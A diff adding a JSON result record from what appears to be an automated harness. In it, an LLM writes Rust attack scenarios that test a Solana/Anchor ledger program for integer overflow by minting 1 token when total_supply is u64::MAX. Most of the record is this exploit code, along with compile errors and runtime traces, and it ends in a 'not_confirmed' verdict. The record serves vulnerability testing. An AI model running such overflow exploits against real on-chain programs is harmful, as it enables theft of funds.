@@ -1,0 +1,95 @@
+{
+  "category": "MATH",
+  "verdict": "not_confirmed",
+  "exploit_successful": false,
+  "attack_result": "Success",
+  "reason": "ataque aceito sem o dano esperado: user_balance deu a volta para 0 (overflow)",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 1882,
+        "completion_tokens": 755,
+        "latency_s": 3.69
+      },
+      "raw": "{\n  \"plan\": \"Inicializamos o ledger com total_supply = u64::MAX e user_balance = 0 usando a instrução initialize (baseline). Em seguida, chamamos mint com amount = 1, que deveria causar overflow se o programa usasse checked_add, mas usa wrapping_add. O efeito medido é que total_supply e user_balance deram a volta para 0, confirmando a vulnerabilidade de overflow.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet ledger_key = Pubkey::new_unique();\\n\\n// Baseline: inicializa o ledger com total_supply = u64::MAX\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(u64::MAX,),\\n    vec![\\n        AccountMeta::new(ledger_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\\n    ],\\n);\\nlet init_accounts = vec![\\n    (ledger_key, empty_account()),\\n    (authority, wallet(1_000_000_000)),\\n    system_program_account(),\\n];\\nlet baseline_result = env.baseline(\\\"initialize ledger with max supply\\\", &init_ix, &init_accounts);\\nassert_eq!(baseline_result.program_result, ProgramResult::Success);\\n\\n// Extrai a conta ledger resultante do baseline\\nlet ledger_account = baseline_result.resulting_accounts.iter()\\n    .find(|(k, _)| *k == ledger_key)\\n    .map(|(_, a)| a.clone())\\n    .expect(\\\"ledger account not found\\\");\\n\\n// Ataque: mint com amount = 1, causando overflow em total_supply e user_balance\\nlet attack_ix = env.anchor_ix(\\n    \\\"mint\\\",\\n    &(1u64,),\\n    vec![\\n        AccountMeta::new(ledger_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet attack_accounts = vec![\\n    (ledger_key, ledger_account),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"mint 1 with total_supply = u64::MAX\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let ledger_after = after(&attack_result, &ledger_key);\\n    let data = ledger_after.data();\\n    // Layout: 8 bytes discriminador + 32 authority + 8 total_supply + 8 user_balance\\n    let total_supply_after = read_u64(data, 40);\\n    let user_balance_after = read_u64(data, 48);\\n    env.effect(\\n        \\\"total_supply deu a volta para 0 (overflow)\\\",\\n        total_supply_after == 0,\\n    );\\n    env.effect(\\n        \\\"user_balance deu a volta para 0 (overflow)\\\",\\n        user_balance_after == 0,\\n    );\\n}\"\n}",
+      "plan": "Inicializamos o ledger com total_supply = u64::MAX e user_balance = 0 usando a instrução initialize (baseline). Em seguida, chamamos mint com amount = 1, que deveria causar overflow se o programa usasse checked_add, mas usa wrapping_add. O efeito medido é que total_supply e user_balance deram a volta para 0, confirmando a vulnerabilidade de overflow.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet ledger_key = Pubkey::new_unique();\n\n// Baseline: inicializa o ledger com total_supply = u64::MAX\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &(u64::MAX,),\n    vec![\n        AccountMeta::new(ledger_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\n    ],\n);\nlet init_accounts = vec![\n    (ledger_key, empty_account()),\n    (authority, wallet(1_000_000_000)),\n    system_program_account(),\n];\nlet baseline_result = env.baseline(\"initialize ledger with max supply\", &init_ix, &init_accounts);\nassert_eq!(baseline_result.program_result, ProgramResult::Success);\n\n// Extrai a conta ledger resultante do baseline\nlet ledger_account = baseline_result.resulting_accounts.iter()\n    .find(|(k, _)| *k == ledger_key)\n    .map(|(_, a)| a.clone())\n    .expect(\"ledger account not found\");\n\n// Ataque: mint com amount = 1, causando overflow em total_supply e user_balance\nlet attack_ix = env.anchor_ix(\n    \"mint\",\n    &(1u64,),\n    vec![\n        AccountMeta::new(ledger_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet attack_accounts = vec![\n    (ledger_key, ledger_account),\n    (authority, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"mint 1 with total_supply = u64::MAX\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let ledger_after = after(&attack_result, &ledger_key);\n    let data = ledger_after.data();\n    // Layout: 8 bytes discriminador + 32 authority + 8 total_supply + 8 user_balance\n    let total_supply_after = read_u64(data, 40);\n    let user_balance_after = read_u64(data, 48);\n    env.effect(\n        \"total_supply deu a volta para 0 (overflow)\",\n        total_supply_after == 0,\n    );\n    env.effect(\n        \"user_balance deu a volta para 0 (overflow)\",\n        user_balance_after == 0,\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0433]: cannot find module or crate `solana_program` in this scope\n  --> tests/attempt.rs:19:39\n   |\n19 | ...ntMeta::new_readonly(solana_program::system_program::id(), false),\n   |                         ^^^^^^^^^^^^^^ use of unresolved module or unlinked crate `solana_program`\n   |\n   = help: if you wanted to use a crate named `solana_program`, use `cargo add solana_program` to add it to your `Cargo.toml`\n\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:15:9\n   |\n13 |     let init_ix = env.anchor_ix(\n   |                       --------- arguments to this method are incorrect\n14 |         \"initialize\",\n15 |         &(u64::MAX,),\n   |         ^^^^^^^^^^^^ expected `&[u8]`, found `&(u64,)`\n   |\n   = note: expected reference `&[u8]`\n              found reference `&(u64,)`\nnote: method defined here\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:39:9\n   |\n37 |     let attack_ix = env.anchor_ix(\n   |                         --------- arguments to this method are incorrect\n38 |         \"mint\",\n39 |         &(1u64,),\n   |         ^^^^^^^^ expected `&[u8]`, found `&(u64,)`\n   |\n   = note: expected reference `&[u8]`\n              found reference `&(u64,)`\nnote: method defined here\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 3 previous errors",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0433]: cannot find module or crate `solana_program` in this scope\n  --> tests/attempt.rs:19:39\n   |\n19 | ...ntMeta::new_readonly(solana_program::system_program::id(), false),\n   |                         ^^^^^^^^^^^^^^ use of unresolved module or unlinked crate `solana_program`\n   |\n   = help: if you wanted to use a crate named `solana_program`, use `cargo add solana_program` to add it to your `Cargo.toml`\n\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:15:9\n   |\n13 |     let init_ix = env.anchor_ix(\n   |                       --------- arguments to this method are incorrect\n14 |         \"initialize\",\n15 |         &(u64::MAX,),\n   |         ^^^^^^^^^^^^ expected `&[u8]`, found `&(u64,)`\n   |\n   = note: expected reference `&[u8]`\n              found reference `&(u64,)`\nnote: method defined here\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:39:9\n   |\n37 |     let attack_ix = env.anchor_ix(\n   |                         --------- arguments to this method are incorrect\n38 |         \"mint\",\n39 |         &(1u64,),\n   |         ^^^^^^^^ expected `&[u8]`, found `&(u64,)`\n   |\n   = note: expected reference `&[u8]`\n              found reference `&(u64,)`\nnote: method defined here\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 3 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2887,
+        "completion_tokens": 759,
+        "latency_s": 3.5
+      },
+      "raw": "{\"plan\": \"Inicializo o ledger com total_supply = u64::MAX via a instrucao initialize (baseline legitimo). Depois chamo mint com amount = 1 usando a mesma authority, o que faz total_supply e user_balance darem a volta por wrapping_add. O efeito medido e que total_supply e user_balance ficam 0 apos o ataque, em vez de a instrucao falhar.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet ledger_key = Pubkey::new_unique();\\n\\n// Baseline: inicializa o ledger com total_supply = u64::MAX\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &u64::MAX.to_le_bytes(),\\n    vec![\\n        AccountMeta::new(ledger_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(system_program_account().0, false),\\n    ],\\n);\\nlet init_accounts = vec![\\n    (ledger_key, empty_account()),\\n    (authority, wallet(1_000_000_000)),\\n    system_program_account(),\\n];\\nlet baseline_result = env.baseline(\\\"initialize ledger with max supply\\\", &init_ix, &init_accounts);\\nassert_eq!(baseline_result.program_result, ProgramResult::Success);\\n\\n// Extrai a conta ledger resultante do baseline\\nlet ledger_account = baseline_result\\n    .resulting_accounts\\n    .iter()\\n    .find(|(k, _)| *k == ledger_key)\\n    .map(|(_, a)| a.clone())\\n    .expect(\\\"ledger account not found\\\");\\n\\n// Ataque: mint com amount = 1, causando overflow em total_supply e user_balance\\nlet attack_ix = env.anchor_ix(\\n    \\\"mint\\\",\\n    &1u64.to_le_bytes(),\\n    vec![\\n        AccountMeta::new(ledger_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet attack_accounts = vec![\\n    (ledger_key, ledger_account),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"mint 1 with total_supply = u64::MAX\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let ledger_after = after(&attack_result, &ledger_key);\\n    let data = ledger_after.data();\\n    // Layout: 8 bytes discriminador + 32 authority + 8 total_supply + 8 user_balance\\n    let total_supply_after = read_u64(data, 40);\\n    let user_balance_after = read_u64(data, 48);\\n    env.effect(\\n        \\\"total_supply deu a volta para 0 (overflow)\\\",\\n        total_supply_after == 0,\\n    );\\n    env.effect(\\n        \\\"user_balance deu a volta para 0 (overflow)\\\",\\n        user_balance_after == 0,\\n    );\\n}\"}",
+      "plan": "Inicializo o ledger com total_supply = u64::MAX via a instrucao initialize (baseline legitimo). Depois chamo mint com amount = 1 usando a mesma authority, o que faz total_supply e user_balance darem a volta por wrapping_add. O efeito medido e que total_supply e user_balance ficam 0 apos o ataque, em vez de a instrucao falhar.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet ledger_key = Pubkey::new_unique();\n\n// Baseline: inicializa o ledger com total_supply = u64::MAX\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &u64::MAX.to_le_bytes(),\n    vec![\n        AccountMeta::new(ledger_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(system_program_account().0, false),\n    ],\n);\nlet init_accounts = vec![\n    (ledger_key, empty_account()),\n    (authority, wallet(1_000_000_000)),\n    system_program_account(),\n];\nlet baseline_result = env.baseline(\"initialize ledger with max supply\", &init_ix, &init_accounts);\nassert_eq!(baseline_result.program_result, ProgramResult::Success);\n\n// Extrai a conta ledger resultante do baseline\nlet ledger_account = baseline_result\n    .resulting_accounts\n    .iter()\n    .find(|(k, _)| *k == ledger_key)\n    .map(|(_, a)| a.clone())\n    .expect(\"ledger account not found\");\n\n// Ataque: mint com amount = 1, causando overflow em total_supply e user_balance\nlet attack_ix = env.anchor_ix(\n    \"mint\",\n    &1u64.to_le_bytes(),\n    vec![\n        AccountMeta::new(ledger_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet attack_accounts = vec![\n    (ledger_key, ledger_account),\n    (authority, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"mint 1 with total_supply = u64::MAX\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let ledger_after = after(&attack_result, &ledger_key);\n    let data = ledger_after.data();\n    // Layout: 8 bytes discriminador + 32 authority + 8 total_supply + 8 user_balance\n    let total_supply_after = read_u64(data, 40);\n    let user_balance_after = read_u64(data, 48);\n    env.effect(\n        \"total_supply deu a volta para 0 (overflow)\",\n        total_supply_after == 0,\n    );\n    env.effect(\n        \"user_balance deu a volta para 0 (overflow)\",\n        user_balance_after == 0,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "initialize ledger with max supply",
+            "result": "Success",
+            "compute_units": 5933,
+            "account_flags": "sw,sw,-r"
+          },
+          {
+            "step": "attack",
+            "note": "mint 1 with total_supply = u64::MAX",
+            "result": "Success",
+            "compute_units": 2185,
+            "account_flags": "-w,sr"
+          },
+          {
+            "step": "effect",
+            "note": "total_supply deu a volta para 0 (overflow)",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "user_balance deu a volta para 0 (overflow)",
+            "holds": false
+          }
+        ],
+        "runtime_trace": [
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 11111111111111111111111111111111 invoke [2]",
+          "Program 11111111111111111111111111111111 success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 5933 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 2185 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA success"
+        ],
+        "elapsed_s": 1.9
+      },
+      "verdict": "not_confirmed",
+      "reason": "ataque aceito sem o dano esperado: user_balance deu a volta para 0 (overflow)"
+    }
+  ],
+  "case_id": "SSP-03-A-V1",
+  "static_finding": {
+    "category": "MATH",
+    "evidence": "",
+    "explanation": "",
+    "attack_hypothesis": "Verificar por execucao se a instrucao e vulneravel a Integer Overflow / Underflow."
+  }
+}
